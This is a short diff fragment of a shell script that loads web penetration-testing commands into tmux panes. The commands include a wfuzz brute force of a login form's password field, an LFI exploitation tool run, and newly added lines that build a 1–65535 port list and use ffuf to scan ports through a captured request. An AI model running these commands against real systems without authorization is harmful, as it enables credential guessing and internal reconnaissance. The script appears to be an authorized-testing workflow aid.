@@ -3316,10 +3316,10 @@ tmux send-keys -t PT:5.2 "# LFI injection automation (POST)" Enter
 tmux send-keys -t PT:5.2 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
 tmux send-keys -t PT:5.3 "# LFI: read file" Enter
 tmux send-keys -t PT:5.3 "sudo python3 /opt/LFIxplorer/LFIxplorer.py burp.req"
-tmux send-keys -t PT:5.4 "# LFI: " Enter
-tmux send-keys -t PT:5.4 ""
-tmux send-keys -t PT:5.5 "# LFI: " Enter
-tmux send-keys -t PT:5.5 ""
+tmux send-keys -t PT:5.4 "# LFI: port scanner - file with ports number" Enter
+tmux send-keys -t PT:5.4 "sudo rm -f $folderProjectWebAuthN/numbers.txt && for i in {1..65535}; do echo $i; done > numbers.txt"
+tmux send-keys -t PT:5.5 "# LFI: port scanner start" Enter
+tmux send-keys -t PT:5.5 "ffuf -request GET-burp-example.req -request-proto http -w numbers.txt:FUZZ -fl 92"
 tmux send-keys -t PT:5.6 "# LFI: " Enter
 tmux send-keys -t PT:5.6 ""
 cd $folderProject
